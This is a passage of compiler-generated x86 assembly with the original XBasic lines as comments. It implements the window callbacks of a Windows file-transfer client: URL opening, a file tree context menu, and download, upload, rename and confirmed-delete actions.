data section 'globals$shared'
align	4
%#edit3_proc.client:	db 4 dup ?
.code
	mov	eax,addr _edit3Proc.client@16			;;; i599
	push	eax			;;; i667a
	push	-4			;;; i656a
	push	[%#edit3.client]			;;; i672a
	call	_SetWindowLongA@12			;;; i619
	mov	d[%#edit3_proc.client],eax			;;; i668
;
; [2046] #up_proc = SetWindowLongA(#upload_tab, $$GWL_WNDPROC, &upProc())
data section 'globals$shared'
align	4
%#up_proc.client:	db 4 dup ?
.code
	mov	eax,addr _upProc.client@16			;;; i599
	push	eax			;;; i667a
	push	-4			;;; i656a
	push	[%#upload_tab.client]			;;; i672a
	call	_SetWindowLongA@12			;;; i619
	mov	d[%#up_proc.client],eax			;;; i668
;
; [2047] #edit6_proc = SetWindowLongA(#edit6, $$GWL_WNDPROC, &edit6Proc())
data section 'globals$shared'
align	4
%#edit6_proc.client:	db 4 dup ?
.code
	mov	eax,addr _edit6Proc.client@16			;;; i599
	push	eax			;;; i667a
	push	-4			;;; i656a
	push	[%#edit6.client]			;;; i672a
	call	_SetWindowLongA@12			;;; i619
	mov	d[%#edit6_proc.client],eax			;;; i668
;
; [2049] #tree_proc = SetWindowLongA(#tree_tab, $$GWL_WNDPROC, &tab6Proc())
data section 'globals$shared'
align	4
%#tree_proc.client:	db 4 dup ?
.code
	mov	eax,addr _tab6Proc.client@16			;;; i599
	push	eax			;;; i667a
	push	-4			;;; i656a
	push	[%#tree_tab.client]			;;; i672a
	call	_SetWindowLongA@12			;;; i619
	mov	d[%#tree_proc.client],eax			;;; i668
;
; [2050] #event_proc = SetWindowLongA(#event_tab, $$GWL_WNDPROC, &eventProc())
data section 'globals$shared'
align	4
%#event_proc.client:	db 4 dup ?
.code
	mov	eax,addr _eventProc.client@16			;;; i599
	push	eax			;;; i667a
	push	-4			;;; i656a
	push	[%#event_tab.client]			;;; i672a
	call	_SetWindowLongA@12			;;; i619
	mov	d[%#event_proc.client],eax			;;; i668
;
; [2052] END FUNCTION
	xor	eax,eax			;;; i862
align 8
end.CreateCallbacks.client:  ;;; Function end label for Assembly Programmers.
end.funcD.client:
	lea	esp,[ebp-20]				;;; i110
	pop	ebx				;;; restore ebx
	pop	edi				;;; restore edi
	pop	esi				;;; restore esi
	leave					;;; replaces 'mov esp,ebp' 'pop ebp'
	ret						;;; i111d
;-peep
;  *****
;  *****  END FUNCTION  CreateCallbacks ()  *****
;  *****
;
; [2054] FUNCTION  eventProc (hWnd, msg, wParam, lParam)
.code
;
#ifdef eventProc.hWnd
#undef eventProc.hWnd
#endif
#define eventProc.hWnd ebp+8	; exposes function argument 'hWnd'
;
;
#ifdef eventProc.msg
#undef eventProc.msg
#endif
#define eventProc.msg ebp+12	; exposes function argument 'msg'
;
;
#ifdef eventProc.wParam
#undef eventProc.wParam
#endif
#define eventProc.wParam ebp+16	; exposes function argument 'wParam'
;
;
#ifdef eventProc.lParam
#undef eventProc.lParam
#endif
#define eventProc.lParam ebp+20	; exposes function argument 'lParam'
;
align 16
_eventProc.client@16:
;  *****
;  *****  FUNCTION  eventProc ()  *****
;  *****
funcE.client:
	push	ebp			;;; i112
	mov	ebp,esp		;;; i113
	sub	esp,8			;;; i114
	push	esi			;;; save esi
	push	edi			;;; save edi
	push	ebx			;;; save ebx
  sub esp,16      ;;; reserved for unwind handler
;
;	#### Begin Local Initialization Code ####
	mov	ecx,2				;;; ..
	xor	eax,eax			;;; ...
A.384:
	push	eax, eax, eax, eax
	dec	ecx					;;; ....
	jnz	< A.384			;;; .....
	push	eax				;;; ......
;	#### End Local Initialization Code ####
;
;	################################################################################
;	### *** IMPORTANT *** - If hand-optimizing by eliminating the initialization ###
;	### code above, the first 'sub esp,____' line below must be uncommented      ###
;	### and the second must be either deleted or commented out.                  ###
;	### !!! Failure to do so will cause the resultant program to crash !!!       ###
;	################################################################################
;
;	sub esp,220
	sub	esp,184			;;; i114a
;
funcBodyE.client:
;
; [2055] SHARED STRING URLBuffer
;
; [2058] SELECT CASE msg
	mov	eax,d[ebp+12]			;;; i665
; .selectE.00CD = ebp-40	; internal variable
	mov	d[ebp-40],eax			;;; i670
;
; [2059] CASE $$WM_COMMAND :
	mov	eax,273			;;; i659
	mov	ebx,d[ebp-40]			;;; i665
	cmp	eax,ebx			;;; i684a
	jne	>> case.00CD.0001.client			;;; i71
;
; [2060] id = LOWORD(wParam)
#ifdef eventProc.id
#undef eventProc.id
#endif
#define eventProc.id ebp-44	; exposes local variable 'id'
;
	push	[ebp+16]			;;; i674a
	call	func1E.client			;;; i619
	mov	d[ebp-44],eax			;;; i670
;
; [2061] notifyCode = HIWORD(wParam)
#ifdef eventProc.notifyCode
#undef eventProc.notifyCode
#endif
#define eventProc.notifyCode ebp-48	; exposes local variable 'notifyCode'
;
	push	[ebp+16]			;;; i674a
	call	func1D.client			;;; i619
	mov	d[ebp-48],eax			;;; i670
;
; [2062] hwndCtl = lParam
#ifdef eventProc.hwndCtl
#undef eventProc.hwndCtl
#endif
#define eventProc.hwndCtl ebp-52	; exposes local variable 'hwndCtl'
;
	mov	eax,d[ebp+20]			;;; i665
	mov	d[ebp-52],eax			;;; i670
;
; [2064] SELECT CASE id
	mov	eax,d[ebp-44]			;;; i665
; .selectE.00CE = ebp-56	; internal variable
	mov	d[ebp-56],eax			;;; i670
;
; [2065] CASE $$EventURL_Open	:IF URLBuffer THEN LaunchBrowser (URLBuffer)
	mov	eax,180			;;; i659
	mov	ebx,d[ebp-56]			;;; i665
	cmp	eax,ebx			;;; i684a
	jne	>> case.00CE.0001.client			;;; i71
	mov	eax,[%URLBuffer.client]			;;; i663a
	test	eax,eax			;;; i214
	jz	>> else.00CF.client			;;; i215
	mov	eax,d[eax-8]			;;; i216
	test	eax,eax			;;; i217
	jz	>> else.00CF.client			;;; i218
	mov	eax,d[%URLBuffer.client]			;;; i663a
	call	%_clone.a0			;;; i634
	push	eax			;;; i667a
	call	func67.client			;;; i619
	sub	esp,4			;;; xnt1i
	mov	esi,d[esp]			;;; i871
	call	%____free			;;; i872
	add	esp,4			;;; i633
else.00CF.client:
end.if.00CF.client:
;
; [2066] 'PRINT "open",URLBuffer
;
; [2067] RETURN 0
	mov	eax,0			;;; i659
	jmp	end.funcE.client			;;; i258
;
; [2068] END SELECT
case.00CE.0001.client:
end.select.00CE.client:
;
; [2069] END SELECT
case.00CD.0001.client:
end.select.00CD.client:
;
; [2071] RETURN CallWindowProcA (#event_proc, hWnd, msg, wParam, lParam)
;
; [0] EXTERNAL FUNCTION CallWindowProcA (lpPrevWndFunc, hWnd, Msg, wParam, lParam)
	push	[ebp+20]			;;; i674a
	push	[ebp+16]			;;; i674a
	push	[ebp+12]			;;; i674a
	push	[ebp+8]			;;; i674a
	push	[%#event_proc.client]			;;; i672a
	call	_CallWindowProcA@20			;;; i619
	jmp	end.funcE.client			;;; i258
;
; [2072] END FUNCTION
	xor	eax,eax			;;; i862
align 8
end.eventProc.client:  ;;; Function end label for Assembly Programmers.
end.funcE.client:
	lea	esp,[ebp-20]				;;; i110
	pop	ebx				;;; restore ebx
	pop	edi				;;; restore edi
	pop	esi				;;; restore esi
	leave					;;; replaces 'mov esp,ebp' 'pop ebp'
	ret	16			;;; i111a
;-peep
;  *****
;  *****  END FUNCTION  eventProc ()  *****
;  *****
;
; [2074] FUNCTION  tab6Proc (hWnd, msg, wParam, lParam)
.code
;
#ifdef tab6Proc.hWnd
#undef tab6Proc.hWnd
#endif
#define tab6Proc.hWnd ebp+8	; exposes function argument 'hWnd'
;
;
#ifdef tab6Proc.msg
#undef tab6Proc.msg
#endif
#define tab6Proc.msg ebp+12	; exposes function argument 'msg'
;
;
#ifdef tab6Proc.wParam
#undef tab6Proc.wParam
#endif
#define tab6Proc.wParam ebp+16	; exposes function argument 'wParam'
;
;
#ifdef tab6Proc.lParam
#undef tab6Proc.lParam
#endif
#define tab6Proc.lParam ebp+20	; exposes function argument 'lParam'
;
align 16
_tab6Proc.client@16:
;  *****
;  *****  FUNCTION  tab6Proc ()  *****
;  *****
func14.client:
	push	ebp			;;; i112
	mov	ebp,esp		;;; i113
	sub	esp,8			;;; i114
	push	esi			;;; save esi
	push	edi			;;; save edi
	push	ebx			;;; save ebx
  push addr free.func14.client
  push ebp
  push addr _XxxUnwinder
  fs push [0]
  fs mov [0],esp  ;;; install unwind handler
;
;	#### Begin Local Initialization Code ####
	mov	ecx,3				;;; ..
	xor	eax,eax			;;; ...
A.387:
	push	eax, eax, eax, eax
	push	eax, eax, eax, eax
	dec	ecx					;;; ....
	jnz	< A.387			;;; .....
;	#### End Local Initialization Code ####
;
;	################################################################################
;	### *** IMPORTANT *** - If hand-optimizing by eliminating the initialization ###
;	### code above, the first 'sub esp,____' line below must be uncommented      ###
;	### and the second must be either deleted or commented out.                  ###
;	### !!! Failure to do so will cause the resultant program to crash !!!       ###
;	################################################################################
;
;	sub esp,220
	sub	esp,124			;;; i114a
;
;	#### Begin Composite Initialization Code ####
	xor	eax,eax		;;; .
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
;	#### End Composite Initialization Code ####
;
	lea	eax,[esp]			;;; i125
	lea	ebx,[esp+8]			;;; i125a
	mov	d[ebp-48],eax			;;; i670
	mov	d[ebp-52],ebx			;;; i670
funcBody14.client:
;
; [2075] STRING filename
#ifdef tab6Proc.filename
#undef tab6Proc.filename
#endif
#define tab6Proc.filename ebp-40	; exposes local variable 'filename'
;
;
; [2076] POINTAPI pt
; .composites = ebp-44	; internal variable
#ifdef tab6Proc.pt
#undef tab6Proc.pt
#endif
#define tab6Proc.pt ebp-48	; exposes local variable 'pt'
;
;
; [2077] TRECT rc
#ifdef tab6Proc.rc
#undef tab6Proc.rc
#endif
#define tab6Proc.rc ebp-52	; exposes local variable 'rc'
;
;
; [2079] SELECT CASE msg
	mov	eax,d[ebp+12]			;;; i665
; .select14.00D0 = ebp-56	; internal variable
	mov	d[ebp-56],eax			;;; i670
;
; [2080] CASE $$WM_KEYDOWN :
	mov	eax,256			;;; i659
	mov	ebx,d[ebp-56]			;;; i665
	cmp	eax,ebx			;;; i684a
	jne	>> case.00D0.0001.client			;;; i71
;
; [2081] SELECT CASE wParam
	mov	eax,d[ebp+16]			;;; i665
; .select14.00D1 = ebp-60	; internal variable
	mov	d[ebp-60],eax			;;; i670
;
; [2082] CASE $$VK_RETURN	:
	mov	eax,13			;;; i659
	mov	ebx,d[ebp-60]			;;; i665
	cmp	eax,ebx			;;; i684a
	jne	>> case.00D1.0001.client			;;; i71
;
; [2083] hItem = getTreeSelection (#tree_tab)
#ifdef tab6Proc.hItem
#undef tab6Proc.hItem
#endif
#define tab6Proc.hItem ebp-64	; exposes local variable 'hItem'
;
	push	[%#tree_tab.client]			;;; i672a
	call	func50.client			;;; i619
	mov	d[ebp-64],eax			;;; i670
;
; [2084] IF RIGHT$(getTreeCompLabel(hItem),1) == "\\" THEN
	sub	esp,64			;;; i487
	push	[ebp-64]			;;; i674a
	call	func52.client			;;; i619
	mov	d[esp],eax			;;; i887
	mov	d[esp+4],1
	call	%_right.d.s			;;; i578
	add	esp,64			;;; i600
	mov	ebx,addr @_string.0149.client			;;; i663
	call	%_string.compare.sv			;;; i690
	jne	>> else.00D2.client			;;; i219
;
; [2085] SendMessageA (#tree_tab, $$TVM_EXPAND,$$TVE_TOGGLE, hItem)
	push	[ebp-64]			;;; i674a
	push	3			;;; i656a
	push	4354			;;; i656a
	push	[%#tree_tab.client]			;;; i672a
	call	_SendMessageA@16			;;; i619
;
; [2086] RETURN
	xor	eax,eax			;;; i862
	jmp	end.func14.client			;;; i258
;
; [2087] END IF
else.00D2.client:
end.if.00D2.client:
;
; [2088] CASE ELSE 	: RETURN CallWindowProcA (#tree_proc, hWnd, msg, wParam, lParam)
	jmp	end.select.00D1.client			;;; i69
case.00D1.0001.client:
	push	[ebp+20]			;;; i674a
	push	[ebp+16]			;;; i674a
	push	[ebp+12]			;;; i674a
	push	[ebp+8]			;;; i674a
	push	[%#tree_proc.client]			;;; i672a
	call	_CallWindowProcA@20			;;; i619
	jmp	end.func14.client			;;; i258
;
; [2089] END SELECT
end.select.00D1.client:
;
; [2091] CASE $$WM_RBUTTONDOWN   :
	jmp	end.select.00D0.client			;;; i69
case.00D0.0001.client:
	mov	eax,516			;;; i659
	mov	ebx,d[ebp-56]			;;; i665
	cmp	eax,ebx			;;; i684a
	jne	>> case.00D0.0002.client			;;; i71
;
; [2092] hItem = getTreeSelection (#tree_tab)
	push	[%#tree_tab.client]			;;; i672a
	call	func50.client			;;; i619
	mov	d[ebp-64],eax			;;; i670
;
; [2093] filename = getTreeCompLabel (hItem)
	push	[ebp-64]			;;; i674a
	call	func52.client			;;; i619
	lea	ebx,[ebp-40]			;;; i5
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [2094] pt.x = LOWORD(lParam): pt.y = HIWORD(lParam)
	push	[ebp+20]			;;; i674a
	call	func1E.client			;;; i619
	mov	ebx,d[ebp-48]			;;; i665
	mov	d[ebx],eax			;;; i13b
	push	[ebp+20]			;;; i674a
	call	func1D.client			;;; i619
	mov	ebx,d[ebp-48]			;;; i665
	mov	d[ebx+4],eax			;;; i13b
;
; [2095] ClientToScreen (hWnd, &pt)
	mov	eax,d[ebp-48]			;;; i642
	push	eax			;;; i667a
	push	[ebp+8]			;;; i674a
	call	_ClientToScreen@8			;;; i619
;
; [2097] IF RIGHT$(filename,1) == "\\" THEN
	sub	esp,64			;;; i487
	mov	eax,[ebp-40]			;;; i665
	mov	d[esp],eax			;;; i887
	mov	d[esp+4],1
	call	%_right.d.v			;;; i578
	add	esp,64			;;; i600
	mov	ebx,addr @_string.0149.client			;;; i663
	call	%_string.compare.sv			;;; i690
	jne	>> else.00D3.client			;;; i219
;
; [2098] ModifyMenuA (#hMenuFolder,$$TreePop_DTitle,$$MF_BYCOMMAND,$$TreePop_DTitle,&filename)
;
; [0] EXTERNAL FUNCTION ModifyMenuA (hMenu, nPosition, wFlags, wIDNewItem, lpString)
	mov	eax,d[ebp-40]			;;; i642
	push	eax			;;; i667a
	push	170			;;; i656a
	push	0			;;; i656a
	push	170			;;; i656a
	push	[%#hMenuFolder.client]			;;; i672a
	call	_ModifyMenuA@20			;;; i619
;
; [2099] TrackPopupMenuEx (#hMenuFolder, $$TPM_LEFTALIGN | $$TPM_LEFTBUTTON | $$TPM_RIGHTBUTTON, pt.x, pt.y, hWnd, 0)
	mov	eax,0			;;; i659
	or	eax,0			;;; i763
	or	eax,2			;;; i763
; .xstk14.0000 = ebp-72	; internal variable
	mov	d[ebp-72],eax			;;; i670
	mov	eax,d[ebp-48]			;;; i665
	mov	eax,d[eax]			;;; i313b
; .xstk14.0001 = ebp-80	; internal variable
	mov	d[ebp-80],eax			;;; i670
	mov	eax,d[ebp-48]			;;; i665
	mov	eax,d[eax+4]			;;; i313b
; .xstk14.0002 = ebp-88	; internal variable
	mov	d[ebp-88],eax			;;; i670
	push	0			;;; i656a
	push	[ebp+8]			;;; i674a
	push	[ebp-88]			;;; i674a
	push	[ebp-80]			;;; i674a
	push	[ebp-72]			;;; i674a
	push	[%#hMenuFolder.client]			;;; i672a
	call	_TrackPopupMenuEx@24			;;; i619
;
; [2100] ELSE
	jmp	end.if.00D3.client			;;; i107
else.00D3.client:
;
; [2101] ModifyMenuA (#hMenuFile,$$TreePop_Title,$$MF_BYCOMMAND | $$MF_DISABLED,$$TreePop_Title, &filename)
	mov	eax,0			;;; i657
	or	eax,2			;;; i763
	mov	d[ebp-72],eax			;;; i670
	mov	eax,d[ebp-40]			;;; i642
	push	eax			;;; i667a
	push	160			;;; i656a
	push	[ebp-72]			;;; i674a
	push	160			;;; i656a
	push	[%#hMenuFile.client]			;;; i672a
	call	_ModifyMenuA@20			;;; i619
;
; [2102] TrackPopupMenuEx (#hMenuFile, $$TPM_LEFTALIGN | $$TPM_LEFTBUTTON | $$TPM_RIGHTBUTTON, pt.x, pt.y, hWnd, 0)
	mov	eax,0			;;; i659
	or	eax,0			;;; i763
	or	eax,2			;;; i763
	mov	d[ebp-72],eax			;;; i670
	mov	eax,d[ebp-48]			;;; i665
	mov	eax,d[eax]			;;; i313b
	mov	d[ebp-80],eax			;;; i670
	mov	eax,d[ebp-48]			;;; i665
	mov	eax,d[eax+4]			;;; i313b
	mov	d[ebp-88],eax			;;; i670
	push	0			;;; i656a
	push	[ebp+8]			;;; i674a
	push	[ebp-88]			;;; i674a
	push	[ebp-80]			;;; i674a
	push	[ebp-72]			;;; i674a
	push	[%#hMenuFile.client]			;;; i672a
	call	_TrackPopupMenuEx@24			;;; i619
;
; [2103] END IF
end.if.00D3.client:
;
; [2105] CASE $$WM_COMMAND :
	jmp	end.select.00D0.client			;;; i69
case.00D0.0002.client:
	mov	eax,273			;;; i659
	mov	ebx,d[ebp-56]			;;; i665
	cmp	eax,ebx			;;; i684a
	jne	>> case.00D0.0003.client			;;; i71
;
; [2106] id = LOWORD(wParam)
#ifdef tab6Proc.id
#undef tab6Proc.id
#endif
#define tab6Proc.id ebp-92	; exposes local variable 'id'
;
	push	[ebp+16]			;;; i674a
	call	func1E.client			;;; i619
	mov	d[ebp-92],eax			;;; i670
;
; [2107] notifyCode = HIWORD(wParam)
#ifdef tab6Proc.notifyCode
#undef tab6Proc.notifyCode
#endif
#define tab6Proc.notifyCode ebp-96	; exposes local variable 'notifyCode'
;
	push	[ebp+16]			;;; i674a
	call	func1D.client			;;; i619
	mov	d[ebp-96],eax			;;; i670
;
; [2108] hwndCtl = lParam
#ifdef tab6Proc.hwndCtl
#undef tab6Proc.hwndCtl
#endif
#define tab6Proc.hwndCtl ebp-100	; exposes local variable 'hwndCtl'
;
	mov	eax,d[ebp+20]			;;; i665
	mov	d[ebp-100],eax			;;; i670
;
; [2109] hItem = getTreeSelection(#tree_tab)
	push	[%#tree_tab.client]			;;; i672a
	call	func50.client			;;; i619
	mov	d[ebp-64],eax			;;; i670
;
; [2111] SELECT CASE id
	mov	eax,d[ebp-92]			;;; i665
; .select14.00D4 = ebp-104	; internal variable
	mov	d[ebp-104],eax			;;; i670
;
; [2112] CASE $$TreePop_DownL	:filename = getTreeCompLabel (hItem)
	mov	eax,161			;;; i659
	mov	ebx,d[ebp-104]			;;; i665
	cmp	eax,ebx			;;; i684a
	jne	>> case.00D4.0001.client			;;; i71
	push	[ebp-64]			;;; i674a
	call	func52.client			;;; i619
	lea	ebx,[ebp-40]			;;; i5
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [2113] SendMessageA (#edit3, $$WM_SETTEXT, 0, &filename)
	mov	eax,d[ebp-40]			;;; i642
	push	eax			;;; i667a
	push	0			;;; i656a
	push	12			;;; i656a
	push	[%#edit3.client]			;;; i672a
	call	_SendMessageA@16			;;; i619
;
; [2114] SendMessageA (#hTabCtl, $$TCM_SETCURFOCUS, 3, 0)
	push	0			;;; i656a
	push	3			;;; i656a
	push	4912			;;; i656a
	push	[%#hTabCtl.client]			;;; i672a
	call	_SendMessageA@16			;;; i619
;
; [2115] CASE $$TreePop_UpL		:filename = getTreeCompLabel (hItem)
	jmp	end.select.00D4.client			;;; i69
case.00D4.0001.client:
	mov	eax,171			;;; i659
	mov	ebx,d[ebp-104]			;;; i665
	cmp	eax,ebx			;;; i684a
	jne	>> case.00D4.0002.client			;;; i71
	push	[ebp-64]			;;; i674a
	call	func52.client			;;; i619
	lea	ebx,[ebp-40]			;;; i5
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [2116] IF RIGHT$(filename,1) != "\\" THEN
	sub	esp,64			;;; i487
	mov	eax,[ebp-40]			;;; i665
	mov	d[esp],eax			;;; i887
	mov	d[esp+4],1
	call	%_right.d.v			;;; i578
	add	esp,64			;;; i600
	mov	ebx,addr @_string.0149.client			;;; i663
	call	%_string.compare.sv			;;; i690
	je	>> else.00D5.client			;;; i219
;
; [2117] filename = getTreeCompLabel(getTreeParent(hItem))
	push	[ebp-64]			;;; i674a
	call	func53.client			;;; i619
	push	eax			;;; i667a
	call	func52.client			;;; i619
	lea	ebx,[ebp-40]			;;; i5
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [2118] END IF
else.00D5.client:
end.if.00D5.client:
;
; [2119] SendMessageA (#edit10, $$WM_SETTEXT, 0, &filename)
	mov	eax,d[ebp-40]			;;; i642
	push	eax			;;; i667a
	push	0			;;; i656a
	push	12			;;; i656a
	push	[%#edit10.client]			;;; i672a
	call	_SendMessageA@16			;;; i619
;
; [2120] SendMessageA (#hTabCtl, $$TCM_SETCURFOCUS, 4, 0)
	push	0			;;; i656a
	push	4			;;; i656a
	push	4912			;;; i656a
	push	[%#hTabCtl.client]			;;; i672a
	call	_SendMessageA@16			;;; i619
;
; [2121] CASE $$TreePop_CreateD	:SendMessageA (#CmdLine, $$WM_SETTEXT, 0, &"/newdir ")
	jmp	end.select.00D4.client			;;; i69
case.00D4.0002.client:
	mov	eax,162			;;; i659
	mov	ebx,d[ebp-104]			;;; i665
	cmp	eax,ebx			;;; i684a
	jne	>> case.00D4.0003.client			;;; i71
	mov	eax,addr @_string.04DB.client			;;; i642
	push	eax			;;; i667a
	push	0			;;; i656a
	push	12			;;; i656a
	push	[%#CmdLine.client]			;;; i672a
	call	_SendMessageA@16			;;; i619
;
; [2122] CASE $$TreePop_DelFile	:text$ = "Delete file:  \n"+getTreeCompLabel(hItem)
	jmp	end.select.00D4.client			;;; i69
case.00D4.0003.client:
	mov	eax,163			;;; i659
	mov	ebx,d[ebp-104]			;;; i665
	cmp	eax,ebx			;;; i684a
	jne	>> case.00D4.0004.client			;;; i71
#ifdef tab6Proc.text$
#undef tab6Proc.text$
#endif
#define tab6Proc.text$ ebp-108	; exposes local variable 'text$'
;
	push	[ebp-64]			;;; i674a
	call	func52.client			;;; i619
	mov	ebx,addr @_string.04DD.client			;;; i663
	push	ebx			;;; i781
	push	eax			;;; i781a
	push	2			;;; i781e
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	lea	ebx,[ebp-108]			;;; i5
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [2123] ret = MessageBoxA (0,&text$,&"Confirm Delete",$$MB_YESNO | $$MB_ICONQUESTION | $$MB_APPLMODAL)
#ifdef tab6Proc.ret
#undef tab6Proc.ret
#endif
#define tab6Proc.ret ebp-112	; exposes local variable 'ret'
;
;
; [0] EXTERNAL FUNCTION MessageBoxA (hwnd, lpText, lpCaption, wType)
	mov	eax,d[ebp-108]			;;; i642
	mov	d[ebp-72],eax			;;; i670
	mov	eax,addr @_string.04DF.client			;;; i642
	mov	d[ebp-80],eax			;;; i670
	mov	eax,4			;;; i659
	or	eax,32			;;; i763
	or	eax,0			;;; i763
	push	eax			;;; i667a
	push	[ebp-80]			;;; i674a
	push	[ebp-72]			;;; i674a
	push	0			;;; i656a
	call	_MessageBoxA@16			;;; i619
	mov	d[ebp-112],eax			;;; i670
;
; [2124] IF (ret == 6) THEN TreeDelFile (hItem)
	mov	eax,d[ebp-112]			;;; i665
	cmp	eax,6			;;; i684a
	jne	>> else.00D6.client			;;; i219
	push	[ebp-64]			;;; i674a
	call	func5A.client			;;; i619
else.00D6.client:
end.if.00D6.client:
;
; [2125] CASE $$TreePop_DTitle	:SendMessageA (#tree_tab, $$TVM_EXPAND,$$TVE_TOGGLE, hItem)
	jmp	end.select.00D4.client			;;; i69
case.00D4.0004.client:
	mov	eax,170			;;; i659
	mov	ebx,d[ebp-104]			;;; i665
	cmp	eax,ebx			;;; i684a
	jne	>> case.00D4.0005.client			;;; i71
	push	[ebp-64]			;;; i674a
	push	3			;;; i656a
	push	4354			;;; i656a
	push	[%#tree_tab.client]			;;; i672a
	call	_SendMessageA@16			;;; i619
;
; [2126] CASE $$TreePop_DelDir	:text$ = "Delete folder:  \n"+getTreeCompLabel(hItem)
	jmp	end.select.00D4.client			;;; i69
case.00D4.0005.client:
	mov	eax,173			;;; i659
	mov	ebx,d[ebp-104]			;;; i665
	cmp	eax,ebx			;;; i684a
	jne	>> case.00D4.0006.client			;;; i71
	push	[ebp-64]			;;; i674a
	call	func52.client			;;; i619
	mov	ebx,addr @_string.04E4.client			;;; i663
	push	ebx			;;; i781
	push	eax			;;; i781a
	push	2			;;; i781e
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	lea	ebx,[ebp-108]			;;; i5
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [2127] ret = MessageBoxA (0,&text$,&"Confirm Delete",$$MB_YESNO | $$MB_ICONQUESTION | $$MB_APPLMODAL)
	mov	eax,d[ebp-108]			;;; i642
	mov	d[ebp-72],eax			;;; i670
	mov	eax,addr @_string.04DF.client			;;; i642
	mov	d[ebp-80],eax			;;; i670
	mov	eax,4			;;; i659
	or	eax,32			;;; i763
	or	eax,0			;;; i763
	push	eax			;;; i667a
	push	[ebp-80]			;;; i674a
	push	[ebp-72]			;;; i674a
	push	0			;;; i656a
	call	_MessageBoxA@16			;;; i619
	mov	d[ebp-112],eax			;;; i670
;
; [2128] IF (ret == 6) THEN TreeDelDir (hItem)
	mov	eax,d[ebp-112]			;;; i665
	cmp	eax,6			;;; i684a
	jne	>> else.00D7.client			;;; i219
	push	[ebp-64]			;;; i674a
	call	func5C.client			;;; i619
else.00D7.client:
end.if.00D7.client:
;
; [2129] CASE $$TreePop_Rename	:SendMessageA (#CmdLine, $$WM_SETTEXT, 0, &"/rename ")
	jmp	end.select.00D4.client			;;; i69
case.00D4.0006.client:
	mov	eax,164			;;; i659
	mov	ebx,d[ebp-104]			;;; i665
	cmp	eax,ebx			;;; i684a
	jne	>> case.00D4.0007.client			;;; i71
	mov	eax,addr @_string.04E5.client			;;; i642
	push	eax			;;; i667a
	push	0			;;; i656a
	push	12			;;; i656a
	push	[%#CmdLine.client]			;;; i672a
	call	_SendMessageA@16			;;; i619
;
; [2130] CASE $$TreePop_RemTree	:SendMessageA (#tree_tab, $$TVM_DELETEITEM, 0, hItem)
	jmp	end.select.00D4.client			;;; i69
case.00D4.0007.client:
	mov	eax,172			;;; i659
	mov	ebx,d[ebp-104]			;;; i665
	cmp	eax,ebx			;;; i684a
	jne	>> case.00D4.0008.client			;;; i71
	push	[ebp-64]			;;; i674a
	push	0			;;; i656a
	push	4353			;;; i656a
	push	[%#tree_tab.client]			;;; i672a
	call	_SendMessageA@16			;;; i619
;
; [2131] CASE $$TreePop_RemFiles	:text$ = "Delete all files and folders from:  \n"+getTreeCompLabel(hItem)
	jmp	end.select.00D4.client			;;; i69
case.00D4.0008.client:
	mov	eax,174			;;; i659
	mov	ebx,d[ebp-104]			;;; i665
	cmp	eax,ebx			;;; i684a
	jne	>> case.00D4.0009.client			;;; i71
	push	[ebp-64]			;;; i674a
	call	func52.client			;;; i619
	mov	ebx,addr @_string.04E6.client			;;; i663
	push	ebx			;;; i781
	push	eax			;;; i781a
	push	2			;;; i781e
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	lea	ebx,[ebp-108]			;;; i5
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [2132] ret = MessageBoxA (0,&text$,&"Confirm Delete",$$MB_YESNO | $$MB_ICONQUESTION | $$MB_APPLMODAL)
	mov	eax,d[ebp-108]			;;; i642
	mov	d[ebp-72],eax			;;; i670
	mov	eax,addr @_string.04DF.client			;;; i642
	mov	d[ebp-80],eax			;;; i670
	mov	eax,4			;;; i659
	or	eax,32			;;; i763
	or	eax,0			;;; i763
	push	eax			;;; i667a
	push	[ebp-80]			;;; i674a
	push	[ebp-72]			;;; i674a
	push	0			;;; i656a
	call	_MessageBoxA@16			;;; i619
	mov	d[ebp-112],eax			;;; i670
;
; [2133] IF (ret == 6) THEN TreeDelAllFiles (hItem)
	mov	eax,d[ebp-112]			;;; i665
	cmp	eax,6			;;; i684a
	jne	>> else.00D8.client			;;; i219
	push	[ebp-64]			;;; i674a
	call	func5B.client			;;; i619
else.00D8.client:
end.if.00D8.client:
;
; [2134] CASE $$TreePop_Prop		:SendSMessage(idx,"fileinfo "+getTreeCompLabel(hItem))
	jmp	end.select.00D4.client			;;; i69
case.00D4.0009.client:
	mov	eax,175			;;; i659
	mov	ebx,d[ebp-104]			;;; i665
	cmp	eax,ebx			;;; i684a
	jne	>> case.00D4.000A.client			;;; i71
#ifdef tab6Proc.idx
#undef tab6Proc.idx
#endif
#define tab6Proc.idx ebp-116	; exposes local variable 'idx'
;
	push	[ebp-64]			;;; i674a
	call	func52.client			;;; i619
	mov	ebx,addr @_string.04E8.client			;;; i663
	push	ebx			;;; i781
	push	eax			;;; i781a
	push	2			;;; i781e
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	push	eax			;;; i667a
	push	[ebp-116]			;;; i674a
	call	func33.client			;;; i619
	sub	esp,8			;;; xnt1i
	mov	esi,d[esp+4]			;;; i871
	call	%____free			;;; i872
	add	esp,8			;;; i633
;
; [2135] CASE $$TreePop_Refresh	:filename = getTreeCompLabel(hItem)
	jmp	end.select.00D4.client			;;; i69
case.00D4.000A.client:
	mov	eax,165			;;; i659
	mov	ebx,d[ebp-104]			;;; i665
	cmp	eax,ebx			;;; i684a
	jne	>> case.00D4.000B.client			;;; i71
	push	[ebp-64]			;;; i674a
	call	func52.client			;;; i619
	lea	ebx,[ebp-40]			;;; i5
	mov	esi,d[ebx]			;;; i6a
